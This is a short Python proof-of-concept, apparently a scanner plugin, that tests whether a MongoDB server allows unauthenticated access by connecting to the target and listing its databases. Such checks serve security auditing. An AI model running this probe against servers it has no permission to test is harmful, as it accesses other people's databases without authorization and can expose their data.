#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# date:2019/06/16

"""
Copyright (c) saucerman (https://saucer-man.com)
See the file 'LICENSE' for copying permission
"""
# mongodb未授权访问
from urllib.parse import urlparse
import pymongo

def poc(url):
    # url = "http://www.example.org:22222/default.html?ct=32&op=92&item=98"
    # --> host:www.example.org   port:22222
    if url[:4] != "http":
        url = "http://" + url
    o = urlparse(url)
    ip = o.hostname
    port = o.port if o.port else 27017
    try:
        conn = pymongo.MongoClient(host=ip, port=port, socketTimeoutMS=3000)
        dbnames = conn.list_database_names()
        return url
    except:
        return False
